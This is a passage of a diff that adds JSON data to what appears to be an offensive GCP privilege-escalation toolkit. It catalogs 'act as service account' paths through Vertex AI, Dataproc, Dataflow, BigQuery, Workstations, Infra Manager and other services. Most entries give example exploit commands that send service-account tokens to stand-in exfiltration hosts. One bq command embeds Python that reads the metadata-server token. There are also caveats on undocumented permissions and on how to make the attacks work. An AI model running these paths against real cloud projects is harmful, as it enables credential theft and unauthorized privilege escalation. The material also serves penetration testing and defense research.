+        "description": "Create a Vertex AI TuningJob (Gemini supervised fine-tuning) with serviceAccount=TARGET_SA. Minimum permissions: aiplatform.tuningJobs.create + aiplatform.tuningJobs.vertexTune (undocumented but required \u2014 without it, serviceAccount is silently dropped) + iam.serviceAccounts.actAs on TARGET_SA. IMPORTANT: No live token exfil path exists for this attack vector \u2014 the Gemini SFT pipeline is fully managed and provides no code injection mechanism. Attack value is API-level confirmation that the tuning job runs as TARGET_SA.",
+        "example_command": "modules run exploit_vertex_tuning_job_as_sa --target-sa {target_sa} --region us-central1 --api-confirm-only --cleanup",
+        "caveats": [
+          "aiplatform.tuningJobs.vertexTune is an undocumented required permission; without it, serviceAccount is silently dropped (HTTP 200, SA not set in GET). Discovery doc does not mention this permission",
+          "actAs enforcement is non-deterministic: sometimes HTTP 400 INVALID_ARGUMENT (explicit error), sometimes HTTP 200 with silent SA drop. Silent drop is the dominant path",
+          "Tuning service agent (service-{PROJECT_NUM}@gcp-sa-vertex-tune.iam.gserviceaccount.com) must have roles/iam.serviceAccountTokenCreator on TARGET_SA for the job to actually run as TARGET_SA",
+          "No code injection path in Gemini SFT managed pipeline \u2014 cannot query IMDS from training container. Use --api-confirm-only for a clean PE confirmation",
+          "Minimum attacker permissions: aiplatform.tuningJobs.create + aiplatform.tuningJobs.vertexTune + roles/iam.serviceAccountUser on TARGET_SA resource"
+        ]
+      },
+      "DEPLOY_VERTEX_ENDPOINT_CUSTOM_CONTAINER_AS_SA": {
+        "edge": "CAN_DEPLOY_VERTEX_ENDPOINT",
+        "requires": [
+          {
+            "permissions": [
+              "aiplatform.endpoints.create",
+              "aiplatform.endpoints.deploy",
+              "aiplatform.models.upload"
+            ]
+          },
+          {
+            "on": "service-account",
+            "permissions": [
+              "iam.serviceAccounts.actAs"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account",
+          "notes": "actAs IS enforced at caller level."
+        },
+        "description": "Create a Vertex AI Endpoint, register a custom prediction container (Docker image you control), and deploy the model with serviceAccount=TARGET_SA. The serving container runs on Vertex-managed GCE-backed compute with metadata server access; prediction request handler code can query IMDS for TARGET_SA's OAuth2 token. Requires aiplatform.endpoints.create + aiplatform.endpoints.deploy + aiplatform.models.upload + iam.serviceAccounts.actAs.",
+        "example_command": "modules run exploit_vertex_endpoint_as_sa --target-sa {target_sa} --exfil-url https://BURP_HOST/path --region us-central1",
+        "caveats": [
+          "actAs IS enforced on the API caller (unlike Custom Jobs and DRPs). Endpoint deployment uses a separate code path from Custom Job scheduling",
+          "PREREQUISITE: Vertex AI Service Agent must have roles/iam.serviceAccountTokenCreator on TARGET_SA",
+          "Requires a custom container image in Artifact Registry or GCR \u2014 DockerHub images are rejected",
+          "Deployment takes 12-17 minutes; set --wait to at least 900",
+          "Module bug fixed: was using global endpoint (aiplatform.googleapis.com) instead of regional ({region}-aiplatform.googleapis.com)"
+        ]
+      },
+      "UPDATE_VERTEX_REASONINGENGINE_AS_SA": {
+        "edge": "CAN_UPDATE_VERTEX_REASONINGENGINE",
+        "requires": [
+          {
+            "permissions": [
+              "aiplatform.reasoningEngines.update"
+            ],
+            "on": "project"
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "PATCH existing Reasoning Engine spec.serviceAccount=TARGET_SA switches effectiveIdentity to TARGET_SA. Lighter than CREATE path \u2014 only needs .update permission on an existing engine. Any :query calls after the patch execute as TARGET_SA.",
+        "example_command": "# exploit_vertex_reasoning_engine_as_sa --target-sa TARGET_SA --existing-engine projects/PROJECT/locations/REGION/reasoningEngines/ID"
+      }
+    },
+    "notebooks": {
+      "CREATE_WORKBENCH_INSTANCE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "notebooks.instances.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_WORKBENCH_INSTANCE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Vertex AI Workbench instance bound to the target SA, using the JupyterLab environment to execute arbitrary notebooks that steal the SA's GCP credentials.",
+        "example_command": "modules exploit_workbench_instance_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "notebooksworkbench"
+      },
+      "CREATE_NOTEBOOKS_EXECUTION_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "notebooks.executions.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_NOTEBOOKS_EXECUTION_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Submit a Notebooks Execution job that runs a Jupyter notebook as the target SA, executing arbitrary Python code that exfiltrates the SA's credentials from the GCE metadata endpoint.",
+        "example_command": "modules exploit_notebooks_execution_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "notebooksexecution"
+      },
+      "CREATE_VERTEX_NOTEBOOK_EXECUTION_AS_SA": {
+        "edge": "CAN_CREATE_VERTEX_NOTEBOOK_EXECUTION",
+        "requires": [
+          {
+            "permissions": [
+              "notebooks.executions.create",
+              "notebooks.operations.get"
+            ]
+          },
+          {
+            "on": "service-account",
+            "permissions": [
+              "iam.serviceAccounts.actAs"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account",
+          "notes": "actAs IS enforced."
+        },
+        "description": "Create a Vertex AI Workbench Notebook Execution (notebookExecutionJob) with serviceAccount=TARGET_SA. The notebook runs on Vertex AI Custom Training infrastructure with TARGET_SA credentials available via the GCE metadata server. Notebook cells can query IMDS to retrieve TARGET_SA's OAuth2 access token. Requires notebooks.executions.create + notebooks.operations.get + iam.serviceAccounts.actAs on TARGET_SA. END-TO-END token recovery confirmed.",
+        "example_command": "modules run exploit_notebooks_execution_as_sa --target-sa {target_sa} --exfil-url https://BURP_HOST/path",
+        "caveats": [
+          "notebooks.operations.get is required to poll execution status \u2014 not documented in public IAM docs but enforced",
+          "PREREQUISITE: service-{PROJECT_NUM}@gcp-sa-notebooks.iam.gserviceaccount.com must have roles/notebooks.serviceAgent at project level. Not auto-granted even when notebooks API is enabled \u2014 may require manual setup",
+          "API uses Vertex AI aiplatform.googleapis.com endpoint (NOT notebooks.googleapis.com v2) \u2014 the correct path is v1/projects/.../notebookExecutionJobs",
+          "Token recovery path: GCS output notebook contains the printed token; scan_log_markers can also find markers in Cloud Logging"
+        ]
+      }
+    },
+    "dataproc": {
+      "CREATE_DATAPROC_CLUSTER_AS_SA": {
+        "permissions": [
+          "dataproc.clusters.create"
+        ],
+        "on": "project",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Dataproc cluster with a high-privilege SA as the node service account. Submit a Spark/Hadoop job \u2192 job runs as that SA. Can exfiltrate the SA token from within the job.",
+        "example_command": "gcloud dataproc clusters create CLUSTER --service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com --region=REGION",
+        "via": "capability",
+        "status": "PROPOSED"
+      },
+      "CREATE_DATAPROC_BATCH_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "dataproc.batches.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_DATAPROC_BATCH_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Submit a Dataproc Serverless batch workload bound to the target SA, executing arbitrary PySpark/Spark code that can steal the SA's GCP credentials from the metadata server.",
+        "example_command": "modules exploit_dataproc_batch_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "dataprocbatch"
+      },
+      "CREATE_DATAPROC_WORKFLOW_TEMPLATE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "dataproc.workflowTemplates.create",
+              "dataproc.workflowTemplates.instantiate"
+            ]
+          }
+        ],
+        "edge": "CREATE_DATAPROC_WORKFLOW_TEMPLATE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create and instantiate a Dataproc Workflow Template that runs as the target SA, executing arbitrary Hadoop/Spark jobs to steal the SA's credentials from the metadata server.",
+        "example_command": "modules exploit_dataproc_workflow_template_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "dataprocworkflowtemplate"
+      },
+      "CREATE_DATAPROC_SESSION_AS_SA": {
+        "edge": "CAN_CREATE_DATAPROC_SESSION",
+        "requires": [
+          {
+            "permissions": [
+              "dataproc.sessions.create"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Dataproc Interactive Session (Spark connect / Jupyter) with the target SA. Sessions are Serverless containers that run as the specified SA and have the metadata server available. Requires actAs at session creation time.",
+        "example_command": "modules run exploit_dataproc_batch_as_sa --target-sa {target_sa} --mode session --cleanup",
+        "caveats": [
+          "Sessions accept the user field (SA email) in the creation request and expose SparkConnect gRPC endpoints (sc://... URLs) rather than a REST API \u2014 code execution requires a SparkConnect-capable client (PySpark 3.4+ or Apache Spark) to connect over gRPC, not curl or HTTP",
+          "DEAD END via pure REST: there is no REST endpoint to submit code or read a metadata token from a running session; all interaction after session creation is gRPC-only"
+        ]
+      }
+    },
+    "dataflow": {
+      "CREATE_DATAFLOW_JOB_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "dataflow.jobs.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_DATAFLOW_JOB_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Launch a Dataflow streaming or batch pipeline that runs as the target SA, executing arbitrary user code on worker VMs to steal the SA's GCP credentials.",
+        "example_command": "modules exploit_dataflow_job_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "dataflowjob"
+      },
+      "CREATE_DATAFLOW_DATAPIPELINE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "datapipelines.pipelines.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_DATAFLOW_DATAPIPELINE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Data Pipelines workflow bound to the target SA, using it to launch Dataflow jobs that execute as the SA and exfiltrate credentials.",
+        "example_command": "modules exploit_dataflow_datapipeline_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "dataflowdatapipeline"
+      }
+    },
+    "bigquery": {
+      "CREATE_BQ_SPARK_PROCEDURE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "bigquery.connections.create"
+            ]
+          },
+          {
+            "permissions": [
+              "bigquery.datasets.create"
+            ]
+          },
+          {
+            "permissions": [
+              "bigquery.jobs.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_BQ_SPARK_PROCEDURE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a BigQuery Spark connection with an auto-managed service account, then run a Spark stored procedure that executes arbitrary Python code as that SA, exfiltrating credentials from the GCE metadata endpoint.",
+        "example_command": "modules exploit_bq_spark_procedure_as_sa --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "bqsparkprocedure"
+      },
+      "DELEGATE_BQ_CONNECTION_AS_SA": {
+        "permissions": [
+          "bigquery.connections.delegate"
+        ],
+        "on": "bigqueryconnection",
+        "description": "Use a BigQuery Spark connection that has been configured with a high-privilege service account (connection SA granted elevated IAM permissions by an admin). Create a Spark stored procedure using the connection \u2192 Spark job runs as the connection SA. No iam.serviceAccounts.actAs required. LIVE-TESTED PARTIAL: connection creation confirmed 2026-09-28.",
+        "example_command": "bq query --nouse_legacy_sql \"CREATE OR REPLACE PROCEDURE PE_DATASET.EXFIL_PROC() WITH CONNECTION \\`PROJECT.REGION.CONNECTION_ID\\` OPTIONS(engine='SPARK') LANGUAGE PYTHON AS ''' import requests; print(requests.get(\"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\", headers={\"Metadata-Flavor\":\"Google\"}).text) '''; CALL PE_DATASET.EXFIL_PROC();\"",
+        "via": "resource",
+        "status": "PROPOSED"
+      },
+      "CREATE_BQ_DATATRANSFER_CONFIG_AS_SA": {
+        "edge": "CAN_CREATE_BQ_DATATRANSFER_AS_SA",
+        "requires": [
+          {
+            "permissions": [
+              "bigquery.transfers.update",
+              "bigquery.datasets.get"
+            ]
+          },
+          {
+            "on": "service-account",
+            "permissions": [
+              "iam.serviceAccounts.actAs"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account",
+          "notes": "actAs IS enforced."
+        },
+        "description": "Create a BigQuery Data Transfer Service scheduled query configuration with the target SA as owner. The DTS service agent runs BigQuery operations as TARGET_SA, enabling BigQuery API access under the target SA's identity.",
+        "example_command": "modules run exploit_bq_datatransfer_config_as_sa --target-sa {target_sa}",
+        "caveats": [
+          "bigquery.datasets.get is an undocumented required permission (not in module docs; discovered during live test)",
+          "bigquery.transfers.update is in roles/bigquery.admin, roles/bigquery.dataEditor, roles/bigquery.user; serviceAccountName is a query param"
+        ]
+      }
+    },
+    "datafusion": {
+      "CREATE_DATAFUSION_INSTANCE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "datafusion.instances.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_DATAFUSION_INSTANCE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Data Fusion instance bound to the target SA (as its Dataproc service account), deploying ETL pipelines that run on Dataproc clusters with the SA's identity.",
+        "example_command": "modules exploit_datafusion_instance_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "datafusioninstance"
+      }
+    },
+    "dataplex": {
+      "CREATE_DATAPLEX_TASK_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "dataplex.tasks.create",
+              "dataplex.tasks.run"
+            ]
+          }
+        ],
+        "edge": "CREATE_DATAPLEX_TASK_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Dataplex task that runs as the target SA on a Spark or Spark SQL workload, stealing the SA's credentials from the GCE metadata server.",
+        "example_command": "modules exploit_dataplex_task_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "dataplextask"
+      }
+    },
+    "batch": {
+      "CREATE_BATCH_JOB_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "batch.jobs.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_BATCH_JOB_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Submit a Cloud Batch job that runs as the target SA, executing arbitrary container workloads that can exfiltrate the SA's GCP metadata credentials.",
+        "example_command": "modules exploit_batch_job_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "batchjob"
+      }
+    },
+    "workflows": {
+      "CREATE_CLOUDWORKFLOWS_EXECUTION_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "workflows.workflows.create",
+              "workflows.executions.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_CLOUDWORKFLOWS_EXECUTION_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Workflow bound to the target SA and execute it, running arbitrary HTTP steps with the SA's OAuth credentials to exfiltrate a token or call privileged APIs.",
+        "example_command": "modules exploit_cloudworkflows_execution_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "cloudworkflowsexecution"
+      }
+    },
+    "tpu": {
+      "CREATE_TPU_NODE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "tpu.nodes.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_TPU_NODE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud TPU node bound to the target SA, running startup script code on the host VM to steal the SA's credentials from the GCE metadata endpoint.",
+        "example_command": "modules exploit_tpu_node_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "tpunode"
+      }
+    },
+    "workstations": {
+      "CREATE_WORKSTATION_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "workstations.workstationConfigs.create",
+              "workstations.workstations.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_WORKSTATION_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Workstation config and workstation bound to the target SA, using the workstation's interactive development environment to steal the SA's credentials.",
+        "example_command": "modules exploit_workstation_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "workstation"
+      },
+      "CREATE_WORKSTATION_CONFIG_AS_SA": {
+        "edge": "CAN_CREATE_WORKSTATION_CONFIG_AS_SA",
+        "requires": [
+          {
+            "permissions": [
+              "workstations.workstationConfigs.create"
+            ]
+          }
+        ],
+        "via": "resource_attachment",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Workstations WorkstationConfig with host.gceInstance.serviceAccount=TARGET_SA. The resulting workstation VMs are GCE instances running as TARGET_SA; any process in the workstation can query http://metadata.google.internal/.../service-accounts/default/token for a ya29.* OAuth2 token.",
+        "example_command": "modules run exploit_workstation_as_sa --target-sa {target_sa} --cluster-id CLUSTER_ID --region us-central1 --exfil-url https://EXFIL_HOST/token",
+        "caveats": [
+          "Requires an existing WorkstationCluster (workstations.workstationClusters.create; takes 10-20 min to provision). Reuse existing clusters",
+          "actAs enforced at WorkstationConfig creation time per IAM audit log",
+          "Also need workstations.workstations.create + workstations.workstations.start to actually launch and get the token (config creation alone sets the SA but the workstation must be started)"
+        ]
+      }
+    },
+    "clouddeploy": {
+      "CREATE_CLOUDDEPLOY_RELEASE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "clouddeploy.deliveryPipelines.create",
+              "clouddeploy.targets.create",
+              "clouddeploy.releases.create",
+              "clouddeploy.rollouts.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_CLOUDDEPLOY_RELEASE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Deploy pipeline, target, release, and rollout that deploys a malicious container as the target SA, stealing the SA's credentials from the deployment runtime.",
+        "example_command": "modules exploit_clouddeploy_target_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "clouddeployrelease"
+      }
+    },
+    "deploymentmanager": {
+      "CREATE_DEPLOYMENTMANAGER_DEPLOYMENT_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "deploymentmanager.deployments.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_DEPLOYMENTMANAGER_DEPLOYMENT_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Deployment Manager deployment that provisions a Compute VM assigned to the target SA, running a startup script exfil to steal the SA's credentials from the metadata server.",
+        "example_command": "modules exploit_deploymentmanager_vm_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "deploymentmanagerdeployment"
+      }
+    },
+    "inframanager": {
+      "CREATE_INFRAMANAGER_DEPLOYMENT_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "config.deployments.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_INFRAMANAGER_DEPLOYMENT_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create an Infrastructure Manager (Cloud Config Controller) deployment bound to the target SA, applying Terraform that provisions resources executing as the SA.",
+        "example_command": "modules exploit_inframanager_deployment_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "inframanagerdeployment"
+      },
+      "CREATE_INFRA_MANAGER_DEPLOYMENT_AS_SA": {
+        "edge": "CAN_CREATE_INFRA_MANAGER_DEPLOYMENT",
+        "requires": [
+          {
+            "permissions": [
+              "config.deployments.create",
+              "storage.objects.create"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account",
+          "notes": "actAs IS enforced at deployment create time."
+        },
+        "description": "Infrastructure Manager (config.googleapis.com) deployment with serviceAccount=TARGET_SA executes Terraform in a Google-managed Cloud Build container. The GCE metadata server inside the container serves tokens for TARGET_SA. Outbound network is reachable from Terraform workers. A Terraform null_resource local-exec can call IMDS and POST the token to any URL. actAs enforced at create time (caller must hold iam.serviceAccounts.actAs on TARGET_SA). IM service agent (service-{NUM}@gcp-sa-config.iam.gserviceaccount.com) needs roles/cloudbuild.builds.builder + roles/serviceusage.serviceUsageConsumer at project level and roles/iam.serviceAccountUser on target SA. Target SA needs roles/storage.admin on the artifacts GCS bucket and roles/config.agent at project level (for state backend). Prereqs: config.deployments.create + iam.serviceAccounts.actAs + writable GCS bucket for Terraform source.",
+        "example_command": "gcloud infra-manager deployments apply gcpwn-pwn --project=PROJECT_ID --location=us-central1 --service-account=projects/PROJECT_ID/serviceAccounts/TARGET_SA_EMAIL --gcs-source=gs://STAGING_BUCKET/tf-poc --artifacts-gcs-bucket=gs://STAGING_BUCKET/artifacts",
+        "caveats": [
+          "Target SA needs roles/config.agent (grants config.deployments.getState + getLock + updateState + deleteState) \u2014 the IM state backend (localhost:3000 sidecar) calls these APIs as the target SA during tf-init and tf-plan. Without this, deployment fails at tf-init with 'Error refreshing state: Failed to get state' 403",
+          "IM service agent (service-{NUM}@gcp-sa-config.iam.gserviceaccount.com) needs roles/cloudbuild.builds.builder + roles/serviceusage.serviceUsageConsumer at project level and roles/iam.serviceAccountUser on target SA. These are normally auto-granted when IM is first enabled, but may need to be re-granted if project permissions were modified",
+          "Target SA needs roles/storage.admin on the artifacts GCS bucket (for Terraform state and artifacts)",
+          "In real attack scenarios, the target SA would already be configured for IM use (admin granted the above); attacker exploits an existing IM-capable SA",
+          "Attacker needs a GCS bucket to upload malicious Terraform (--gcs-source)",
+          "Always pass --artifacts-gcs-bucket to the module; if omitted, IM tries to auto-create a blueprint-config bucket which may fail if the service agent is missing permissions",
+          "Terraform 1.5.7 is the runtime version (null_resource + local-exec are standard TF features)",
+          "Build takes ~2 minutes from deployment creation to local-exec execution",
+          "Do NOT specify workerPool in the deployment body \u2014 the default is fine and specifying 'projects/.../workerPools/default' causes REVISION_FAILED (worker pool not found)",
+          "Use the full resource name for serviceAccount: 'projects/{PROJECT}/serviceAccounts/{EMAIL}'",
+          "The local-exec command uses bash -c and can call curl to query the metadata server and POST to Burp or write to GCS",
+          "External HTTPS IS reachable from Infra Manager Terraform workers (confirmed reachable)"
+        ]
+      }
+    },
+    "vmmigration": {
+      "CREATE_VMMIGRATION_IMAGE_IMPORT_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "vmmigration.imageImports.create",
+              "vmmigration.targetProjects.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_VMMIGRATION_IMAGE_IMPORT_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a VM Migration image import that provisions a new Compute VM running as the target SA, with a startup script that exfiltrates the SA's credentials from the metadata endpoint.",
+        "example_command": "modules exploit_vmmigration_image_import_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "vmmigrationimageimport"
+      },
+      "CREATE_VMMIGRATION_MIGRATING_VM_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "vmmigration.sources.create",
+              "vmmigration.migratingVms.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_VMMIGRATION_MIGRATING_VM_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a VM Migration source and MigratingVm resource with computeEngineTargetDefaults.serviceAccount set to the target SA. When cutover is triggered, the resulting GCE VM runs as the target SA and exposes its token via the GCE metadata endpoint.",
+        "example_command": "modules exploit_vmmigration_migrating_vm_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "vmmigrationmigratingvm"
+      },
+      "CREATE_VM_MIGRATION_IMAGE_IMPORT_AS_SA": {
+        "edge": "CAN_CREATE_VM_MIGRATION_IMAGE_IMPORT",
+        "requires": [
+          {
+            "permissions": [
+              "vmmigration.imageImports.create"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "VM Migration Image Import with serviceAccount=TARGET_SA set at creation. The API ACCEPTED the request without returning an actAs 403 (only requires vmmigration.imageImports.create to reach the business logic check), but whether actAs is checked at execution time is UNVERIFIED \u2014 requires a real GCS OVA to complete the import and observe the service agent's actAs behavior.",
+        "example_command": "modules run exploit_vmmigration_image_import_as_sa --target-sa {target_sa} --target-project-resource projects/PROJECT/locations/REGION/targetProjects/TP_ID",
+        "caveats": [
+          "UNVERIFIED (): No actAs 403 at CREATE time, but actAs may only be checked when the import runs (service agent token mint). A real GCS-hosted OVA/VMDK is needed to test past the HTTP 404",
+          "A pre-existing targetProject resource is needed (created by admin-level user); no valid IAM permission exists to create targetProjects as a low-privilege attacker",
+          "Attacker SA had zero project-level actAs and zero SA-level actAs bindings (verified before test) \u2014 so if actAs IS enforced at create time, this would be a bypass. Test inconclusive at create time"
+        ]
+      }
+    },
+    "firebase": {
+      "CREATE_FIREBASE_BACKEND_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "firebaseapphosting.backends.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_FIREBASE_BACKEND_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Firebase App Hosting backend bound to the target SA, deploying arbitrary Next.js/web server code that exfiltrates the SA's credentials from the metadata endpoint.",
+        "example_command": "modules exploit_firebase_app_hosting_backend_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "firebasebackend"
+      }
+    },
+    "appintegrations": {
+      "CREATE_APP_INTEGRATION_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "integrations.integrations.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_APP_INTEGRATION_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create an Application Integration workflow bound to the target SA, using REST Task steps to exfiltrate the SA's OAuth token to a callback URL.",
+        "example_command": "modules exploit_app_integration_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "appintegration"
+      },
+      "CALL_API_AS_SA_VIA_INTEGRATION": {
+        "edge": "CAN_INVOKE_INTEGRATION_AS_SA",
+        "requires": [
+          {
+            "permissions": [
+              "integrations.integrations.create",
+              "integrations.integrations.deploy",
+              "integrations.integrations.invoke"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create, deploy, and invoke an Application Integration workflow configured with the target SA for HTTP task authentication. The integration can call any googleapis.com REST endpoint authenticated as the target SA \u2014 including setIamPolicy, generating tokens, or calling storage/BigQuery APIs. Similar to CREATE_CLOUDSCHEDULER_JOB_AS_SA but using the Application Integration runtime. Does not return the raw OAuth2 token; use to confirm identity or make privileged API calls on behalf of the target SA.",
+        "example_command": "gcloud integrations execute pwn-integration --location us-central1 --project PROJECT_ID",
+        "caveats": [
+          "PREREQUISITE: AIIP service agent must have roles/iam.serviceAccountTokenCreator on TARGET_SA (grant via iam.serviceAccounts.setIamPolicy)"
+        ]
+      },
+      "EXECUTE_APP_INTEGRATION_AS_SA": {
+        "edge": "CAN_EXECUTE_APP_INTEGRATION_AS_SA",
+        "requires": [
+          {
+            "permissions": [
+              "integrations.integrations.create",
+              "integrations.integrationversions.create",
+              "integrations.integrations.execute"
+            ],
+            "on": "project"
+          },
+          {
+            "permissions": [
+              "iam.serviceAccounts.setIamPolicy"
+            ],
+            "on": "service-account",
